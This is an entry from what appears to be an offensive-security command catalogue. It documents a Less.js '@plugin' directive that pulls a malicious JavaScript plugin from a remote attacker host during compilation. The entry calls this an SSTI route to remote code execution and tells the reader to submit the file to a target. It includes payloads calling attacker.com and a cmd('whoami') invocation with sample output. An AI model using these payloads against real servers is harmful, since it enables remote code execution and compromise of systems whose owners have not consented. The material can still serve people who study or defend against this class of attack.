---
type: command
executor: less
data: '@plugin "http://attacker.com/plugin.js"'
output: null
created_at: '2023-04-06T03:56:40.037552+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
  - Node.js
tags:
  - ssti
  - less.js
  - plugin-import
verified: true
validated: true
---

# less-import-remote-plugin

## Command

```less
@plugin "$_PLUGIN_URL"
```

## Description

This Less directive imports an external JavaScript plugin from a remote URL during the Less compilation process. In vulnerable Less.js versions, this leads to execution of the plugin code on the server, enabling SSTI exploits for RCE. Use this in a .less file submitted to a target that processes dynamic CSS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PLUGIN_URL | Full URL to the malicious plugin JavaScript file (e.g., http://attacker.com/plugin.js) | Yes |

## Examples

### Basic Usage

```less
@plugin "http://attacker.com/plugin.js"
```

### With Function Invocation

```less
@plugin "http://attacker.com/plugin.js";
.test { content: cmd(`whoami`); }
```

## Expected Output

The directive fetches and executes the plugin silently during compilation. No direct output from the directive itself, but subsequent function calls (e.g., cmd()) may embed command results in the compiled CSS, such as:

```css
.test { content: "www-data"; }
```

If the command fails, compilation may error with Node.js exceptions visible in server logs.

## Related

- [[procedures/Exploit-SSTI-in-Less.js-Plugins-for-RCE]]
- [[codes/less-js-malicious-plugin-registration]]
